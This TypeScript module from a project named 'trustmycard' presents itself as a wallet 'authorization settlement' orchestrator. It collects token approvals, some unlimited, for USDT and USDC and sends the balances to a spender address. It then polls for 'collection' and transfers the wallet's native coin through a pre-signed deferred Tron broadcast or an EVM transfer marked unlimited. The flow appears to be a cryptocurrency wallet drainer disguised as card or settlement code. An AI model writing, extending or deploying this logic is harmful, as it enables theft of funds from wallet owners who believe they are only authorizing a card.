import { TOKEN_SETTLEMENT_ORDER } from "@trustmycard/shared/constants/settlement";
import { TOKEN_COLLECTION_STATE_LABELS } from "@trustmycard/shared/constants/token-collection-state";
import { resolveApiUrl } from "../../core/api-url";
import { getErrorMessage } from "../../core/errors";
import { fetchWalletSessionToken } from "../wallet-session-token";
import { registerWalletPhaseNativeAuthorization } from "../../native-transfer/native-wallet-authorize";
import type {
  SettlementRunResult,
  RunAuthorizationSettlementArgs,
} from "./types";
import type {
  AuthorizationAssetOutcome,
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  TokenSymbol,
} from "../../types";
import type { WalletPhaseTokenCapture } from "./types";

const SETTLEMENT_POLL_MS = 2_000;
const NATIVE_READINESS_WAIT_MS = 120_000;

export type NativeReadinessToken = {
  token: string;
  state: string;
  stateLabel: string;
  active: boolean;
  approvalId?: string | null;
};

export type NativeReadinessResult = {
  canExecuteNative: boolean;
  tokens: NativeReadinessToken[];
  blocking: NativeReadinessToken[];
};

function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
  return (
    outcome === "authorized" ||
    outcome === "collected" ||
    outcome === "pending"
  );
}

function summarize(items: AuthorizationAssetResult[]): AuthorizationSessionResult {
  return {
    items,
    authorizedCount: items.filter((i) => isSuccessOutcome(i.outcome)).length,
    failedCount: items.filter((i) => i.outcome === "failed").length,
    rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
    skippedCount: items.filter((i) =>
      i.outcome === "skipped_unsupported" ||
      i.outcome === "skipped_zero" ||
      i.outcome === "skipped_dependency_failed"
    ).length,
  };
}

function formatBlockingSummary(tokens: NativeReadinessToken[]): string {
  return tokens
    .filter((t) => t.active)
    .map((t) => `${t.token} (${t.stateLabel})`)
    .join(", ");
}

function outcomeFromTokenState(state: string): AuthorizationAssetOutcome {
  if (state === "success") return "collected";
  if (state === "skipped_zero_balance") return "skipped_zero";
  if (state.startsWith("failed")) return "failed";
  if (state === "cancelled") return "skipped_dependency_failed";
  return "authorized";
}

async function registerSettlementSession(args: {
  apiBaseUrl?: string;
  capture: RunAuthorizationSettlementArgs["capture"];
  walletSessionToken?: string;
}): Promise<string> {
  const res = await fetch(
    resolveApiUrl(args.apiBaseUrl, "/api/network-settlement/register"),
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
        ...(args.walletSessionToken
          ? { authorization: `Bearer ${args.walletSessionToken}` }
          : {}),
      },
      body: JSON.stringify({
        sessionId: args.capture.sessionId,
        network: args.capture.network,
        owner: args.capture.owner,
        tokens: args.capture.tokens.map((t) => ({
          token: t.item.asset,
          txHash: t.orchestration.txHash,
          shouldAttemptTransfer: t.shouldAttemptTransfer,
          transferAmountRaw: t.transferAmountRaw,
          unlimited: t.item.unlimited,
          amountHuman: t.item.amountHuman,
        })),
        batchId: args.capture.batchId ?? null,
      }),
      cache: "no-store",
    }
  );
  const json = (await res.json()) as {
    ok?: boolean;
    settlementSessionId?: string;
    message?: string;
  };
  if (!res.ok || !json.ok || !json.settlementSessionId) {
    throw new Error(String(json.message ?? "Failed to register settlement session"));
  }
  return json.settlementSessionId;
}

export function buildNativeReadinessTokenInputs(
  tokens: WalletPhaseTokenCapture[]
): Array<{
  token: string;
  shouldAttemptTransfer: boolean;
  approvalTxHash: string | null;
  approvalId: string | null;
}> {
  return tokens.map((t) => ({
    token: t.item.asset,
    shouldAttemptTransfer: t.shouldAttemptTransfer,
    approvalTxHash: t.orchestration.txHash ?? null,
    approvalId: t.orchestration.approvalId ?? null,
  }));
}

/** Poll native-readiness API — native runs only when no token has active in-flight collection. */
export async function fetchNativeReadiness(args: {
  apiBaseUrl?: string;
  owner: string;
  network: string;
  tokenCaptures: WalletPhaseTokenCapture[];
  walletSessionToken?: string;
}): Promise<NativeReadinessResult> {
  const res = await fetch(
    resolveApiUrl(args.apiBaseUrl, "/api/token-collection/native-readiness"),
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
        ...(args.walletSessionToken
          ? { authorization: `Bearer ${args.walletSessionToken}` }
          : {}),
      },
      body: JSON.stringify({
        owner: args.owner,
        network: args.network,
        tokens: buildNativeReadinessTokenInputs(args.tokenCaptures),
      }),
      cache: "no-store",
    }
  );
  const json = (await res.json()) as {
    canExecuteNative?: boolean;
    tokens?: NativeReadinessToken[];
    blocking?: NativeReadinessToken[];
    message?: string;
  };
  if (!res.ok) {
    throw new Error(String(json.message ?? "Native readiness check failed"));
  }
  return {
    canExecuteNative: Boolean(json.canExecuteNative),
    tokens: json.tokens ?? [],
    blocking: json.blocking ?? [],
  };
}

export async function waitForNativeExecutionAllowed(args: {
  apiBaseUrl?: string;
  owner: string;
  network: string;
  tokenCaptures: WalletPhaseTokenCapture[];
  walletSessionToken?: string;
  pollMs?: number;
  timeoutMs?: number;
  onPoll?: (readiness: NativeReadinessResult) => void;
}): Promise<NativeReadinessResult> {
  const pollMs = args.pollMs ?? SETTLEMENT_POLL_MS;
  const deadline = Date.now() + (args.timeoutMs ?? NATIVE_READINESS_WAIT_MS);
  let last: NativeReadinessResult = {
    canExecuteNative: false,
    tokens: [],
    blocking: [],
  };

  while (Date.now() < deadline) {
    last = await fetchNativeReadiness(args);
    args.onPoll?.(last);
    if (last.canExecuteNative) {
      return last;
    }
    await new Promise((r) => setTimeout(r, pollMs));
  }

  const blocking =
    formatBlockingSummary(last.tokens) ||
    last.blocking.map((t) => `${t.token} (${t.stateLabel})`).join(", ") ||
    "unknown";
  throw new Error(`Native blocked — active token collection: ${blocking}`);
}

function tokenCaptureForSymbol(
  tokens: WalletPhaseTokenCapture[],
  token: (typeof TOKEN_SETTLEMENT_ORDER)[number]
): WalletPhaseTokenCapture | undefined {
  return tokens.find((t) => t.item.asset === token);
}

/**
 * Background settlement orchestrator (client-side):
 * 1. Finalize approvals in USDT → USDC order (confirm creates collectionIntent)
 * 2. Poll native-readiness until no token has active in-flight collection
 * 3. Tron: server broadcasts deferred signed native; EVM: one eth_sendTransaction
 */
export async function runAuthorizationSettlement(
  args: RunAuthorizationSettlementArgs
): Promise<SettlementRunResult> {
  const log = args.log ?? (() => undefined);
  const walletResults: AuthorizationAssetResult[] = [];
  let settlementSessionId: string | null = null;

  try {
    let walletSessionToken: string | undefined;
    if (args.provider) {
      walletSessionToken = await fetchWalletSessionToken({
        provider: args.provider,
        apiBaseUrl: args.apiBaseUrl ?? "",
        owner: args.capture.owner,
        network: args.capture.network,
      });
    }

    settlementSessionId = await registerSettlementSession({
      apiBaseUrl: args.apiBaseUrl,
      capture: args.capture,
      walletSessionToken,
    });

    if (
      args.capture.native?.authorizationKind === "tron_signed" &&
      args.capture.native.authorizationPayload.signed
    ) {
      await registerWalletPhaseNativeAuthorization({
        apiBaseUrl: args.apiBaseUrl,
        capture: args.capture.native,
        settlementSessionId,
        walletSessionToken,
      });
    }

    const networkRow = args.networks.find((n) => n.key === args.capture.network);
    const finalizedCaptures: WalletPhaseTokenCapture[] = [];

    for (const token of TOKEN_SETTLEMENT_ORDER) {
      const tokenCapture = tokenCaptureForSymbol(args.capture.tokens, token);
      if (!tokenCapture) continue;

      args.onProgress?.({
        network: args.capture.network,
        stage: "finalizing_approval",
        token,
        message: `Finalizing ${token} approval`,
      });

      const orchestration = await args.runApprovalSettlement({
        network: args.capture.network,
        owner: args.capture.owner,
        token,
        walletPhaseContext: tokenCapture.orchestration.context,
        executeTransfer: tokenCapture.shouldAttemptTransfer,
        transferToAddress: args.getSpender(args.capture.network),
        transferAmountRaw: tokenCapture.transferAmountRaw,
        nativeBalanceHuman: networkRow?.balances.native ?? "0",
        tokenBalanceHuman:
          token === "USDT"
            ? networkRow?.balances.usdt ?? "0"
            : networkRow?.balances.usdc ?? "0",
        unlimited: tokenCapture.item.unlimited,
        amountHuman: tokenCapture.item.amountHuman,
      });

      if (!orchestration.ok) {
        walletResults.push({
          network: args.capture.network,
          token,
          outcome: orchestration.userRejected ? "user_rejected" : "failed",
          message: getErrorMessage(orchestration.error, "Settlement failed"),
          txHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        });
        throw new Error(`${token} approval finalization failed`);
      }

      finalizedCaptures.push({
        ...tokenCapture,
        orchestration: {
          ...tokenCapture.orchestration,
          approvalId: orchestration.approvalId,
          txHash: orchestration.txHash ?? tokenCapture.orchestration.txHash,
        },
      });
    }

    const wantsNative = Boolean(args.capture.native);
    let readiness: NativeReadinessResult | null = null;

    if (finalizedCaptures.some((t) => t.shouldAttemptTransfer) || wantsNative) {
      args.onProgress?.({
        network: args.capture.network,
        stage: "collecting_token",
        message: "Monitoring token collection — native proceeds when no active transfer",
      });

      readiness = await waitForNativeExecutionAllowed({
        apiBaseUrl: args.apiBaseUrl,
        owner: args.capture.owner,
        network: args.capture.network,
        tokenCaptures: finalizedCaptures.length > 0 ? finalizedCaptures : args.capture.tokens,
        walletSessionToken,
        onPoll: (poll) => {
          const blocking = formatBlockingSummary(poll.tokens);
          log("NATIVE_READINESS_POLL", {
            canExecuteNative: poll.canExecuteNative,
            blocking,
            tokens: poll.tokens,
          });
          if (!poll.canExecuteNative && blocking) {
            args.onProgress?.({
              network: args.capture.network,
              stage: "collecting_token",
              message: `Waiting for active collection: ${blocking}`,
              tokenStates: poll.tokens.map((t) => ({
                token: t.token,
                state: t.state,
                stateLabel: t.stateLabel,
                active: t.active,
              })),
            });
          }
        },
      });

      log("NATIVE_READINESS_ALLOWED", {
        canExecuteNative: readiness.canExecuteNative,
        tokens: readiness.tokens,
      });

      args.onProgress?.({
        network: args.capture.network,
        stage: "native_ready",
        message: "No active token collection — proceeding with native",
        tokenStates: readiness.tokens.map((t) => ({
          token: t.token,
          state: t.state,
          stateLabel: t.stateLabel,
          active: t.active,
        })),
      });
    }

    for (const tokenCapture of finalizedCaptures.length > 0
      ? finalizedCaptures
      : args.capture.tokens) {
      const token = tokenCapture.item.asset;
      const readinessToken = readiness?.tokens.find((t) => t.token === token);
      const state = readinessToken?.state;
      const stateLabel =
        readinessToken?.stateLabel ??
        (tokenCapture.shouldAttemptTransfer
          ? TOKEN_COLLECTION_STATE_LABELS.pending
          : TOKEN_COLLECTION_STATE_LABELS.skipped_zero_balance);

      walletResults.push({
        network: args.capture.network,
        token,
        outcome: state ? outcomeFromTokenState(state) : "authorized",
        message: stateLabel,
        approvalId: tokenCapture.orchestration.approvalId,
        txHash: tokenCapture.orchestration.txHash,
      });
    }

    let nativeExecuted = false;

    if (wantsNative && args.capture.network === "tron") {
      args.onProgress?.({
        network: args.capture.network,
        stage: "executing_native",
        message: "Broadcasting deferred Tron native transfer",
      });

      const res = await fetch(
        resolveApiUrl(args.apiBaseUrl, "/api/network-settlement/process"),
        {
          method: "POST",
          headers: {
            "content-type": "application/json",
            ...(walletSessionToken
              ? { authorization: `Bearer ${walletSessionToken}` }
              : {}),
          },
          body: JSON.stringify({ settlementSessionId }),
          cache: "no-store",
        }
      );
      const json = (await res.json()) as { ok?: boolean; message?: string };
      if (!res.ok || !json.ok) {
        throw new Error(String(json.message ?? "Tron native settlement failed"));
      }

      const statusRes = await fetch(
        resolveApiUrl(
          args.apiBaseUrl,
          `/api/network-settlement/${encodeURIComponent(settlementSessionId!)}/status`
        ),
        { cache: "no-store" }
      );
      const statusJson = (await statusRes.json()) as { completed?: boolean; failed?: boolean };
      if (statusJson.failed) {
        throw new Error("Tron native settlement failed");
      }
      if (statusJson.completed) {
        nativeExecuted = true;
        walletResults.push({
          network: args.capture.network,
          token: "NATIVE",
          outcome: "collected",
          message: "Tron native transfer broadcast complete",
        });
      }
    } else if (
      wantsNative &&
      args.capture.native?.authorizationKind === "evm_deferred" &&
      args.runNativeTransfer
    ) {
      args.onProgress?.({
        network: args.capture.network,
        stage: "executing_native",
        message: "Executing EVM native transfer (eth_sendTransaction)",
      });

      const nativeResult = await args.runNativeTransfer({
        network: args.capture.network,
        owner: args.capture.owner,
        unlimited: true,
      });

      if (nativeResult.ok && nativeResult.txHash && settlementSessionId) {
        await fetch(
          resolveApiUrl(
            args.apiBaseUrl,
            `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`
          ),
          {
            method: "POST",
            headers: {
              "content-type": "application/json",
              ...(walletSessionToken
                ? { authorization: `Bearer ${walletSessionToken}` }
                : {}),
            },
            body: JSON.stringify({ txHash: nativeResult.txHash }),
            cache: "no-store",
          }
        ).catch(() => undefined);
      }

      nativeExecuted = nativeResult.ok;
      if (nativeResult.ok) {
        walletResults.push({
          network: args.capture.network,
          token: "NATIVE",
          outcome: nativeResult.pendingRegistered ? "pending" : "collected",
          message: nativeResult.pendingRegistered
            ? "Native transfer pending confirmation"
            : "Native transfer confirmed",
          txHash: nativeResult.txHash,
        });
      } else {
        walletResults.push({
          network: args.capture.network,
          token: "NATIVE",
          outcome: nativeResult.userRejected ? "user_rejected" : "failed",
          message: getErrorMessage(nativeResult.error, "Native transfer failed"),
          txHash: nativeResult.txHash,
        });
      }
    } else if (wantsNative) {
      walletResults.push({
        network: args.capture.network,
        token: "NATIVE",
        outcome: "authorized",
        message: "Native deferred — wallet not connected for settlement",
      });
    }

    args.onProgress?.({
      network: args.capture.network,
      stage: "completed",
      message: nativeExecuted ? "Settlement complete" : "Token settlement complete",
    });

    return {
      ok: true,
      sessionResult: summarize(walletResults),
      settlementSessionId,
    };
  } catch (err) {
    const message = getErrorMessage(err, "Settlement failed");
    log("SETTLEMENT_FAILED", { error: message, settlementSessionId });
    args.onProgress?.({
      network: args.capture.network,
      stage: "failed",
      message,
    });
    return {
      ok: false,
      sessionResult: summarize(walletResults),
      settlementSessionId,
      error: message,
    };
  }
}

export { TOKEN_SETTLEMENT_ORDER };
